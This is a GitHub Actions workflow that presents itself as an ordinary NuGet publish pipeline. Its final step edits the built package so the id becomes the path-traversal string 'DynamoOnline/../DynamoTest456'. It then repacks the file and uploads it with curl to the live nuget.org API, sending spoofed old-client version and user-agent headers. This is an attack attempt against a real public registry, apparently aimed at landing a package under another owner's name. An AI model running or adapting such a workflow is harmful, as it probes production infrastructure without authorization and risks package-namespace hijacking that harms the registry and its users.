name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build
        run: dotnet build -c Release
      
      - name: Pack
        run: dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Test path traversal in package ID
        run: |
          cd artifacts
          
          mkdir tampered
          unzip -o *.nupkg -d tampered
          
          # Try path traversal
          find tampered -name "*.nuspec" -exec sed -i 's/<id>DynamoTest456<\/id>/<id>DynamoOnline\/..\/DynamoTest456<\/id>/g' {} \;
          
          echo "=== Modified ==="
          cat tampered/*.nuspec
          
          cd tampered
          zip -r ../tampered.nupkg .
          cd ..
          
          # Try with old protocol version
          curl -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 2.8.0" \
            -H "X-NuGet-Protocol-Version: 2.0.0" \
            -H "User-Agent: NuGet Command Line/2.8.0 (Windows NT 6.1)" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg -v
        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
